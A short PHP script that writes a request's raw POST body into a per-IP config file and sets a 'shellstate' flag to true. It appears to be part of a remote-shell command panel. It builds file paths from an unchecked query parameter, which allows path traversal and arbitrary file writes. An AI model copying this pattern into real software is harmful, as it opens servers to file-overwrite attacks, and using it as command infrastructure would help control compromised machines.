<?php
$Ip = $_GET["ip"];
$PostBody = file_get_contents("php://input");
$ConfigFile = fopen("config/".$Ip."/postconfig.cir","w+");

fwrite($ConfigFile,$PostBody);
fclose($ConfigFile);
$ConfigFile_2 = fopen("config/".$Ip."/shellstate.cir","w+");
fwrite($ConfigFile_2,"true");
fclose($ConfigFile_2);
?>